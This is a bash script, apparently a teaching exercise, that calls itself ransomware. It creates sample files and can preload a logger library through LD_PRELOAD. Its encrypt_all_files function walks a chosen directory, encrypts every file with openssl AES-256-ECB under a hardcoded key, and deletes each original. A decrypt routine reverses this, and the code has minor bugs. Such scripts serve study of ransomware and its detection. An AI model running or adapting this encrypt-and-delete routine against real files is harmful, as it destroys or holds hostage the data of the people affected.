#!/bin/bash

############################################# USEFULL VARIABLES #############################################

NEW_FILES_INPUT='Created original file number '
DIRPATH=
CREATE_FILES=
ENCRYPT_FILES=
DECRYPT=
ENCRYPT=
PRELOADING=
CREATED_FILES_ARRAY=()
ENCRUPTION_METHOD=aes-256-ecb
ENCRYPTION_KEY=mousakas

############################################# USEFULL FUNCTIONS #############################################

print_usage() {
    echo "Usage: sh ransomware -flag -option [option argument] "
    echo ""
    echo "option:"
    echo "    p     The action's directory"
    echo "    c     The number of files the user wants to create"
    echo "    e     The number of files the user wants to create and encrypt"
    echo ""
    echo "flag:"
    echo "    l     Loads the logger.so library "
    echo "    h     Prints the help menu"
    echo "    n     Encrypt all the files (not .encrypt) of the given directory "
    echo "    d     Decrypts all the .encrypt files of the given directory"
    exit 1
}

check_args(){
    local dir=$DIRPATH
    local cFiles=$CREATE_FILES
    local eFiles=$ENCRYPT_FILES
    local dec=$DECRYPT
    local enc=$ENCRYPT

    # checking if directory defined, if not print usage
    if ! [ -n "$dir" ] ; then
	    print_usage
    fi
    # checking if any of the available actions defined, if not print usage
    if ! [ -n "$cFiles" ] && ! [ -n "$eFiles" ] && ! [ -n "$dec" ] && ! [ -n "$enc" ] ; then 
		print_usage
    fi
}

get_args(){
    while getopts "p:e:c:dnhl" opt; do
        case $opt in
            p)
                DIRPATH=$OPTARG/
                ;;
            e)
                ENCRYPT_FILES=$OPTARG
                ;;
            c)
                CREATE_FILES=$OPTARG
                ;;
            d)
                DECRYPT=1
                ;;
            n)
                ENCRYPT=1
                ;;
            l)
                PRELOADING==1
                ;;
            h) 
                print_usage
                ;;
            \?)
                print_usage
                ;;

        esac
    done
}


create_x_files () {
    CREATED_FILES_ARRAY=()
    local limit=$1
    local files=1;
    while [[ $files -le $limit ]];
    do 
        local rnd=$RANDOM
        local fl=$DIRPATH'file_'$rnd.txt
        while  [ -f $fl ];
        do
            fl=$DIRPATH'file_'$RANDOM.txt
        done
        ./createFile -p $fl -m "$NEW_FILES_INPUT$rnd."
        CREATED_FILES_ARRAY+=($fl)
        ((files = files + 1))
    done
}

encrypt_x_files () {
    create_x_files $ENCRYPT_FILES
    for file in "${CREATED_FILES_ARRAY[@]}";
    do 
        OPENSSL_INPUT_FILE=$file
        OPENSSL_OUTPUT_FILE=$file.encrypt
        openssl enc -$ENCRUPTION_METHOD -pbkdf2 -in $OPENSSL_INPUT_FILE -out $OPENSSL_OUTPUT_FILE -k $ENCRYPTION_KEY
        rm -f $file
    done
}

encrypt_all_files () {
    find $DIRPATH -not -name "*.encrypt" -not -type d -print0 > tmpfile
    while IFS=  read -r -d $'\0';
    do  
        OPENSSL_INPUT_FILE=$REPLY
        OPENSSL_OUTPUT_FILE=$REPLY.encrypt
        openssl enc -$ENCRUPTION_METHOD -pbkdf2 -in $OPENSSL_INPUT_FILE -out $OPENSSL_OUTPUT_FILE -k $ENCRYPTION_KEY
        rm -f $REPLY 
    done < tmpfile
    rm -f tmpfile
}

decrypt_files() {
    find $DIRPATH -name "*.encrypt" -not -type d -print0 > tmpfile
    while IFS=  read -r -d $'\0';
    do  
        OPENSSL_INPUT_FILE=$REPLY
        OPENSSL_OUTPUT_FILE=$(sed 's/.encrypt//' <<< "$REPLY")
        openssl $ENCRUPTION_METHOD -d -pbkdf2 -in $OPENSSL_INPUT_FILE -out $OPENSSL_OUTPUT_FILE -k $ENCRYPTION_KEY
        rm -f $REPLY 
    done < tmpfile
    rm -f tmpfile
}

############################################# EXECUTABLE #############################################


# rm *.txt *.encrypt
get_args "$@"
check_args

if [ -n "$PRELOADING" ]; then
    export LD_PRELOAD=./logger.so
fi
echo $LD_PRELOAD
if [ -n "$CREATE_FILES" ]; then
    create_x_files $CREATE_FILES
fi
if [ -n "$ENCRYPT_FILES" ]; then
    encrypt_x_files
fi
if [ -n "$DECRYPT" ] ; then 
    decrypt_files
fi
if [ -n "$ENCRYPT" ] ; then 
    encrypt_all_files
fi
if [ -n "$PRELOADING" ]; then
    unset LD_PRELOAD
fi

